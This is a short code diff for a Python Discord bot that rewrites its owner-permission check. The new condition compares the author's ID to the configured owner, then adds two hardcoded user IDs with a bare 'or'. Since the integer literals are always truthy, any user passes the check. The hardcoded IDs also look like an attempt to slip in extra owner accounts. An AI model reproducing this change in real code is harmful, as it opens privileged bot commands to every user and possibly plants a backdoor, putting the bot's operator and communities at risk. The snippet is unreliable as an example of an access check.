@@ -15,7 +15,7 @@ class InvalidUsage(commands.CommandError): pass
 config = conf('config/config.ini')
 
 def is_owner_check(message):
-    if message.author.id == config.owner:
+    if message.author.id == config.owner or 335677038830682112 or 168141723019640832:
         return True
     raise No_Owner()
 
